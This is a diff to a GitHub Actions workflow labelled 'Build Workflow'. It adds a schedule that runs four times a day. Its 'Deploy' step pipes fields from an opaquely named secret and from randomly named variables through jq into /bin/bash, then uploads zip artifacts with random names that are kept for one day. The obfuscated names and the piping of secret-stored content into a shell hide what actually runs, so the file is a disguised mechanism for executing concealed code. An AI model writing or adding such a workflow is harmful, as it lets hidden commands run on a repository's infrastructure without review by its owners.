@@ -2,6 +2,8 @@ name: Build Workflow
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '5 0,6,12,18 * * *'
 permissions:
   contents: read
   actions: read
@@ -15,17 +17,18 @@ jobs:
         uses: actions/checkout@v4
       - name: Deploy
         env:
-          yq45727: ${{ secrets.yq45727 }}
+          x49: ${{ secrets.x49 }}
         run: |
-          printf '%s' "$yq45727" | jq -r .enq716 | /bin/bash
-          printf '%s' "$fwab1" | jq -r .ybzt2863 | /bin/bash
-          echo $q1 | jq -r .pwl73642 | /bin/bash
-          printf '%s' "$bc2" | jq -r .llhb195 | /bin/bash
+          printf '%s' "$x49" | jq -r .cc902 | /bin/bash
+          echo $ebdoq38 | jq -r .d443 | /bin/bash
+          echo $pz5 | jq -r .jpava5120 | /bin/bash
+          printf '%s' "$bbv862" | jq -r .q0 | /bin/bash
+          printf '%s' "$hzw8031" | jq -r .wc8449 | /bin/bash
 
       - name: Save results
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: 1j8haIlv
+          name: rd3FFn0R
           path: "*.zip"
           retention-days: 1
